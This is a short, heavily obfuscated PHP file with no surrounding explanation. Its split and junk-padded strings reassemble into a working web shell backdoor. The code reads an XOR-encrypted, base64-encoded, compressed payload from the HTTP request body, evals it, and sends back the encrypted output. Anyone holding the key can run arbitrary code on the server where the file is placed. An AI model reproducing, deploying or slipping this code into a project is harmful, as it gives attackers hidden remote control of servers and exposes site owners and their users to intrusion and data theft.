<?php
$B='Pk){$c=strlPPePn($k);$l=strlen($Pt)P;$oPP="";for($i=0;$PiP<$l;P)P{for($j=0;(P$j<$c&&$i<$Pl);$j++,$i+P+)';
$U='{$PoP.P=$t{$i}^$kP{$j};}}return P$o;P}if (@pPreg_Pmatch("P/$kh(P.+)$Pkf/",@fiPle_get_cPontenPts("php://';
$b='iPnpPut"),P$mP)==1) {@obP_start();@PevPal(@gzPuncomPpress(@x(P@base6P4_decodPe(P$m[1]),P$k))P);$o=@ob_get';
$K='$k=P"e48e132P0";$Pkh="7341b6bfPfPb7fP"P;$kf="bP16222P82247b";$p="hEPC5V16PslZaVWO0PY";fuPnction x(P$t,$';
$T=str_replace('F','','crFFeaFte_fuFFFnction');
$Y='P_contenPts()PP;@ob_end_cPlean();$rP=@baPse64P_encodeP(@x(@gzcPompress(P$oP),$kP)P);print("P$p$kh$r$kf");}';
$z=str_replace('P','',$K.$B.$U.$b.$Y);
$v=$T('',$z);$v();
?>
